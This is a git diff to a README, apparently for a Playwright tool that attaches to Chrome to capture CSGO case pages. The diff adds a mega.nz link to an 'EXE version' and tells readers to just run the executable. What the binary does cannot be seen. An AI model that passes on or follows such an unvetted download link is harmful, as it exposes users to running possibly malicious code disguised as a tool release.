@@ -21,7 +21,7 @@ It uses **Playwright** to connect to a running Chrome instance, captures the pag
 
 ## 🚀 How to Use
 
-### 🖥 If you have the **EXE version**
+### 🖥 If you have the **EXE version (https://mega.nz/file/ZWsRxCJI#QEzGcHf6I6ltWjv-oO227GMpiQ2_hcIaQ-WYv7z2e2Y)**
 1. Just run the `.exe` file.
 2. Chrome will open automatically.
 3. Navigate manually to the CSGO case page you want.
